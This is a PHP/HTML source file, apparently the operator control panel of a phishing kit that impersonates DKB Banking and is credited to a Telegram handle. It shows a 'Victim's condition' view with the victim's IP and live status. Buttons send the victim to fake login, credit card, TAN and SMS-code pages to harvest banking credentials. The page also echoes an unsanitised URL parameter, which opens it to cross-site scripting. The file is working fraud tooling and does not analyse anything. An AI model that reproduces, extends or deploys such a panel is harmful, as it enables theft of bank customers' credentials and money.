<?php 



     require_once "functions.php";
     require_once "ajax.php";


                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================



?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>
          Panel | DKB Banking
        </title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/lol.css">
        <link rel="stylesheet"  href="css/animate.css">
</head>
<body class="modal-open">


         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center " style="background:rgba(0, 0, 0, 0.1);">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88.59 49.13" fill="none" width="60px"><title>DKB Logo</title><path d="M0 0h12.88C20.26 0 29 5.42 29 16.21c0 9.92-8.75 16.22-16.13 16.22H0zm19.79 16.21c0-6.76-5.54-8.1-10.6-8.1v16.21c5.06 0 10.6-1.34 10.6-8.1zM32.63 0h9.23v12.18h.09L49.23 0h10.6l-9.66 14.87 10.6 17.59h-10.6l-8.19-13.98h-.1v13.98h-9.21V0zm30.64 0h13.35c6 0 10.12 3.52 10.12 8.1 0 3.07-1.09 5.7-3.6 6.46v.1c2.07.76 5.45 3.51 5.45 7.89 0 6.48-5.07 9.91-10.6 9.91H63.27zM75.3 12.97c1.57 0 2.91-.98 2.91-2.84 0-1.75-1.34-2.85-2.9-2.85h-2.82v5.7zm.82 11.75c1.84 0 2.9-1.44 2.9-3.24 0-1.8-1.47-3.25-3.31-3.25h-3.22v6.49zM3.19 48.92H0v-9.97h3.13c2.4 0 5.1 1.65 5.1 4.98 0 3.3-2.73 4.99-5.04 4.99zm-.5-8.26H1.9v6.52h.78c1.69 0 3.53-1.04 3.53-3.28 0-2.2-1.84-3.24-3.53-3.24zm11 8.26v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.7-1.19-2.7-3.12 0-1.92 1.3-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H13.7zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm6.6 4.65a3.26 3.26 0 01-2.28-.94l.75-1.14c.37.37 1.03.74 1.53.74.53 0 .75-.19.75-.5 0-1-2.78-.63-2.78-2.75 0-1.13 1-1.65 2.12-1.65 1.03 0 1.66.19 2.28.68l-.75 1a2.71 2.71 0 00-1.4-.42c-.32 0-.63.06-.63.43 0 .73 2.9.6 2.9 2.75.04 1.4-1.09 1.8-2.5 1.8zm11.03-.21l-1.87-2.51h-.03v2.51h-1.79V38.79h1.79v6.4h.02l1.6-2.08h2.13l-2.29 2.78 2.57 3.06h-2.13v-.03zm6.97 0v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.69-1.19-2.69-3.12 0-1.92 1.28-3.12 2.69-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H36.8zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.72 1.53 1.4 1.53c.85 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm8.82 4.44v-3.18c0-.83-.29-1.26-1.13-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.44 2.44 0 011.91-.77c1.38 0 2.16.77 2.16 2.3v3.73H44.1zm7.31 0v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18H47.3V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm10.32 0h-3.41v-9.97h3.13c1.68 0 3.12 1 3.12 2.5 0 1.1-.56 1.93-1.28 2.24.72.27 1.69.98 1.69 2.35.03 1.78-1.4 2.88-3.25 2.88zm-.4-8.38h-1.07v2.35h1.06c.72 0 1.4-.33 1.4-1.19 0-.83-.68-1.16-1.4-1.16zm.12 3.94h-1.22v2.79h1.22c1 0 1.56-.55 1.56-1.38 0-.86-.56-1.4-1.56-1.4zm9.28 4.44v-.55h-.03c-.47.55-1.19.76-2.03.76-1.41 0-2.7-1.19-2.7-3.12 0-1.92 1.29-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8h-1.78zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.66-1.53-1.5-1.53zm8.81 4.44v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm6.88 0l-1.88-2.51H83v2.51h-1.78V38.79h1.78v6.4h.03l1.6-2.08h2.12l-2.28 2.78 2.56 3.06h-2.09v-.03z" fill="#148dea"></path></svg>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-12">
                        <div class="PANEL " style="max-width: 500px;margin:0 auto;">
                            <div class="text-center"><img src="image/hack.avif" width="200px" class="img-fluid"></div>
                            <h1 class="mt-3" style="font-size:20px;font-weight:700;">Victim's condition</h1>
                            <!-- <span id="status" style="display:flex;height:45px;color: white;font-size:17px;font-weight: 600;width:120px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;">
                            </span>  -->
                            <ul class="nav" style="border:1px solid #aaa;line-height: 45px;padding-left:10px;">
                                <li class="nav-item" style="width:40%;border-right:1px solid #aaa;font-weight: 600;">IP:</li>
                                <li class="nav-item" style="width:60%;width:60%;display:flex;align-items: center;">
                                    <span  style="display:flex;align-items: center; height:35px;color: white;font-size:15px;font-weight: 600;width:100px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;background: #148DEA;">
                                        <?php echo $_GET['ip']; ?>
                                    </span> 
                                </li>
                            </ul>
                            <ul class="nav" style="border:1px solid #aaa;border-top: none; line-height: 45px;padding-left:10px;">
                                <li class="nav-item" style="width:40%;border-right:1px solid #aaa;font-weight: 600;">Status:</li>
                                <li class="nav-item" style="width:60%;display:flex;align-items: center;">
                                    <span id="status" style="display:flex;align-items: center; height:35px;color: black;font-size:15px;font-weight: 600;width:100px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;">
                                    </span> 
                                </li>
                            </ul>
                        </div>
                        <hr>
                        <h4>Panel Control</h4>
                        <form action="infos.php" method="post" class="p-4" style="flex-wrap: wrap;display: flex;justify-content: center;">
                            <input  type="hidden" name="step" value="control">
                            <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                            <!-- START___LOGIN -->
                            <div class=" atlanta shadow  mt-4" style="width:100%;text-align: center; padding: 20px; border-top: 3px solid #148DEA">
                                <b class="mb-3">Redrect to</b>
                                <br>
                                <br>
                                <button type="submit" class="btn btn-danger px-3 m-2 " name="to" value="login">LOGIN</button>
                                <button type="submit" class="btn btn-primary px-3 m-2 " name="to" value="cc">CC </button>
                                <button type="submit" class="btn btn-success px-3 m-2 " name="to" value="tan">TAN</button>
                                <button type="submit" class="btn btn-primary px-3 m-2 " name="to" value="tan_2">SMS</button>
                                <button type="submit" class="btn btn-danger px-3 m-2 " name="to" value="tan_3">SMS</button>
                                <button type="submit" class="btn btn-outline-primary px-3 m-2 " name="to" value="success">SUCCESS</button>
                            </div>
                        </form>
                    </div>
                 </div>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
        $(document).ready(function() {
            setInterval(function() {
                $.ajax({
                    type: "GET",
                    url: "sse-server.php?ip=.<?=$_GET['ip']?>",
                    success: function(response) {
                        console.log(response);
                        $("#status").text(response);
                    },
                    error: function(error) {
                        console.error(error);
                    }
                });
            }, 2000); 
        });
        </script>
              
</body>
</html>

